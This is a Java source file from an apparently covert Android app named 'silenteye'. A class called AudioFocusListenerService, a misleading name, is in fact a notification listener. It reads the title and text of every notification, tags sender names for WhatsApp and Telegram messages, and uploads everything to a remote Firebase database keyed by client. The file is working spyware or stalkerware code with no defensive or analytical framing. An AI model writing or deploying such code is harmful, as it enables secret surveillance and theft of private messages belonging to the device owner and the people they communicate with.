package com.silenteye;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.util.HashMap;
import java.util.Map;

public class AudioFocusListenerService extends NotificationListenerService {

    private static final String TAG = "AudioFocusListener";
    private DatabaseReference databaseReference;

    @Override
    public void onCreate() {
        super.onCreate();
        // Path: clients/{CLIENT_ID}/notifications
        databaseReference = ClientManager.getChildRef("notifications");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null)
            return;

        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();

        CharSequence textCharSequence = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = textCharSequence != null ? textCharSequence.toString() : "";
        
        CharSequence titleCharSequence = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
        String title = titleCharSequence != null ? titleCharSequence.toString() : "";

        Log.d(TAG, "Notification posted by: " + packageName + " | Title: " + title + " | Text: " + text);

        Map<String, Object> notificationData = new HashMap<>();
        notificationData.put("packageName", packageName);
        notificationData.put("text", text);
        notificationData.put("timestamp", System.currentTimeMillis());
        
        // Add sender/title if it's a messaging app
        if (packageName.equals("com.whatsapp") || packageName.equals("org.telegram.messenger") || packageName.equals("com.whatsapp.w4b")) {
            notificationData.put("senderName", title);
        }

        if (databaseReference != null) {
            databaseReference.push().setValue(notificationData)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "Successfully sent notification to Firebase"))
                    .addOnFailureListener(e -> Log.e(TAG, "Failed to send notification to Firebase", e));
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }
}
